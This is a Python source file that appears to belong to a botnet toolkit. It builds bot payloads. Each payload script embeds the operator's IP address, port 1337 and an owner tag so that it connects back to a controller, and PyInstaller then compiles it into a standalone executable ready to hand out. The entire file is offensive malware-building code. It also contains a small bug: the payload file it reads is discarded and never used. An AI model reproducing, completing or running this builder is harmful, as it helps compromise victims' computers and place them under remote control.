import os
from urllib.request import pathname2url
import subprocess

from botnet import utils

def main(owner):
    try:
        var = utils.variable(5)
        payload = _payload(owner, var=var)
        executable = _executable(owner, var=var)
        
        return executable
    except Exception as e:
        utils.log(f"An error occurred: {e}", level='error')


def _payload(owner, var=None):

    main = f"""if __name__ == '__main__':
    _payload = Payload(host='{utils.local_ip()}', port='1337', owner='{owner}')
    _payload.run()"""
    
    payload = open("botnet/core/payload", 'r').read()
    payload = '\n'.join([main, utils.payload])
    
    if not os.path.isdir('botnet/payloads'):
        try:
            os.mkdir('botnet/payloads')
        except OSError:
            utils.log("Permission denied: unabled to make directory 'botnet/payloads/'", level='error')

    dirname = 'botnet/payloads'

    path = os.path.join(os.path.abspath(dirname), var + '.py' )

    with open(path, 'w') as fp:
        fp.write(payload)

def _executable(owner, var=None):

    script_name = f"botnet/payloads/{var}.py"
    
    if not os.path.isfile(script_name):
        utils.log(f"The script '{script_name}' does not exist.", level='error')
        exit(1)

    build_dir = os.path.join('executables', owner, 'build')
    spec_dir = os.path.join('executables', owner, 'spec')
    output_dir = os.path.join('executables', owner, 'exe')

    if not os.path.isdir(output_dir):
        try:
            os.makedirs(output_dir)
        except OSError:
            utils.log("Permission denied: unable to make directory 'botnet/executables'")
    
    pyinstaller_command = [
        'pyinstaller',
        '--distpath', 
        output_dir,
        '--specpath', 
        spec_dir,
        '--workpath',
        build_dir,
        '--onefile',
    ]

    try:
        subprocess.run(pyinstaller_command + [script_name], check=True)
        utils.log(f"Standalone executable generated in the '{output_dir}' directory.")
    except subprocess.CalledProcessError:
        utils.log("Failed to build the executable.", level='error')
        exit(1)
        
    return os.path.join(output_dir, f"{var}.exe")
    
    